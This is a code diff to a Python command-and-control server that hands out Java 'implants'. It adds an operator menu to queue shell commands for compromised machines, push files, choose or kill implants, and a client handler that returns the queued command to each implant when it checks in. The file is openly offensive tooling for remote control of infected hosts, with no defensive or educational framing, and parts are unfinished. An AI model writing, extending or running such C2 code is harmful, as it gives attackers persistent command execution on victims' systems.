@@ -11,6 +11,11 @@ class C2Server:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.sock.bind((self.host, self.port))
+        self.cur_implant = "implant_1.java"
+        self.cur_implant_hash, self.cur_implant_path = self.find_current_implant()
+        self.selected_command = "na"
+        self.args = None
+        self.file_name = None
 
     def listen(self):
         print("Listening for conns")
@@ -19,61 +24,111 @@ class C2Server:
             clientConn, addr = self.sock.accept()
             print("Accepted client from:", addr)
             clientConn.settimeout(69)
-            threading.Thread(target=ClientHandler, args=(clientConn, addr)).start()
+            threading.Thread(
+                target=ClientHandler,
+                args=(
+                    clientConn,
+                    addr,
+                    self.selected_command,
+                    self.cur_implant_hash,
+                    self.cur_implant_path,
+                    self.args,
+                ),
+            ).start()
+            self.printMenu()
+
+    def invalidChoice(self):
+        return input("Error: Invalid choice..")
 
     def printMenu(self):
-        print("menu")
+        print("\n------------------------------------")
+        print("Currently selected implant: " + str(self.cur_implant))
+        print("Currently selected operation: " + str(self.selected_command))
+        if self.selected_command == "bc":
+            print("Currently selected command: " + str(self.args))
+        if self.selected_command == "dl":
+            print("Currently selected file: " + str(self.args))
+        print(
+            """ 
+
+1.) Execute single command
+2.) Upload file to implant
+3.) Upload script
+4.) Choose new implant
+5.) Kill and delete implant
+6.) Do nothing
+
+        """
+        )
+        print("Select option:")
+
+    def setCommmandAndArgs(self, selection):
+        if selection == 1:
+            self.selected_command = "bc"
+            self.args = input("Type command to be excuted: ")
+        elif selection == 2:
+            self.selected_command = "dl"
+            self.args = input("Type filename of file: ")
+        elif selection == 3:
+            pass
+        elif selection == 4:
+            self.cur_implant = input("Type filename of implant: ")
+            self.cur_implant_hash, self.cur_implant_path = self.find_current_implant()
+        elif selection == 5:
+            choice = input("Are you sure(yes/no)? ")
+            if choice == "yes":
+                input("Killing and deleting implant...")
+            elif choice == "no":
+                input("Implant not deleted...")
+            else:
+                self.invalidChoice()
+        elif selection == 6:
+            self.selected_command = "na"
+            self.args = ""
+            print("Opertation Cleared...")
+        else:
+            self.invalidChoice()
 
     def run(self):
         threading.Thread(target=self.listen).start()
         while True:
             self.printMenu()
-            selection = input("Select option")
+            selection = int(input())
+            self.setCommmandAndArgs(selection)
 
     def find_current_implant(self):
-        implants = {}
-        for file in os.listdir("./Implants"):
-            if file.endswith(".java"):
-                implant_path = os.path.join("./Implants", file)
-                creation_time = int(os.path.getctime(implant_path))
-                implants[creation_time] = implant_path
-        cur_implant = None
-        for key in implants.keys():
-            if cur_implant == None:
-                cur_implant = key
-            if cur_implant < key:
-                cur_implant = key
-        with open("current_hash.txt", "w") as f:
-            self.cur_hash = cur_implant
-            self.cur_hash_path = implants[cur_implant]
-            f.write(str(cur_implant))
-
-    def json_resc(self):
-        json_data = ""
-        while True:
-            try:
-                json_data += self.conn.recv(bufferSz).decode("utf-8")
-                return json_data
-            except ValueError:
-                continue
-
-    def send_file(self):
-        f = open(self.cur_hash_path, "rb")
-        line = f.read(1024)
-        print("Starting file transfer...")
-        while line:
-            self.conn.send(line)
-            line = f.read(1024)
-        f.close()
-        print("File transfered")
+        implant = {}
+        if not os.path.isfile("./implants/" + str(self.cur_implant)):
+            self.invalidChoice()
+            self.cur_implant = "implant_1.java"  # This should be default implant
+        for file in os.listdir("./implants"):
+            if file.endswith(".java") and file == self.cur_implant:
+                implant_path = os.path.join("./implants", file)
+                cur_implant = int(os.path.getctime(implant_path))
+                implant[cur_implant] = implant_path
+        if cur_implant:
+            with open("current_hash.txt", "w") as f:
+                f.write(str(cur_implant))
+            return cur_implant, implant[cur_implant]
 
 
 class ClientHandler:
-    def __init__(self, clientConn: socket, addr) -> None:
-        print("starting handler")
+    def __init__(
+        self,
+        clientConn: socket,
+        addr,
+        selected_command,
+        cur_implant_hash,
+        cur_implant_path,
+        args,
+    ) -> None:
         self.clientConn = clientConn
         self.addr = addr
         self.MSGSIZE = 4096
+        self.selected_command = selected_command
+        self.args = args
+        self.cur_implant_hash = cur_implant_hash
+        self.cur_implant_path = cur_implant_path
         self.main()
 
     def sendMsg(self, message: str):
@@ -84,34 +139,34 @@ class ClientHandler:
         receivedMessage = self.clientConn.recv(self.MSGSIZE).decode("utf-8")
         return receivedMessage
 
+    def sendFile(self, path: str):
+        print("sending")
+        with open(path, "r") as f:
+            while True:
+                bytesRead = f.read(self.MSGSIZE)
+                if not bytesRead:
+                    print("done sending file")
+                    break
+                self.sendMsg(bytesRead)
+        print("done")
+
     def doAction(self, command: str, arguments: list[str]):
-        if command == "hash":
-            if arguments[0] == "this":  # TODO make this the hash
-                print("Implant is unchanged...")
-                self.sendMsg("No new implant found...")
-            else:
-                print("New Implant Detected.. Sending new implant")
-                self.sendMsg("TODO: send new implant")
-                # hash_string = "New Hash: " + str(self.cur_hash)
-                # self.conn.send(hash_string.encode())
-                # self.send_file()
-        elif command == "info":
-            pass
-        elif command == "ready":
-            with open("commands.txt", "r") as f:
-                for line in f.readlines():
-                    self.sendMsg(line)
-        elif command == "echo":
-            print("Echoing message")
-            self.sendMsg(" ".join(arguments))
-        elif command == "what":
-            self.sendMsg("sc")
+        if command == "hash":  # Send current hash back
+            self.sendMsg(str(self.cur_implant_hash))
+        elif command == "update":  # TODO send updated hash if implant is outdated
+            self.sendMsg("New Hash: " + str(self.cur_implant_hash))
+        elif command == "what":  # Send command back to implant
+            if self.selected_command == "na":
+                self.sendMsg("na")
+            elif self.selected_command == "bc":
+                self.sendMsg("bc " + self.args)
 
     def main(self):
         while True:
             try:
                 data = self.recvMsg()
                 if data:
+                    # *args in the format ["arg1", "arg2"]
                     command, *args = data.split()
                     self.doAction(command, args)
             except Exception as e:
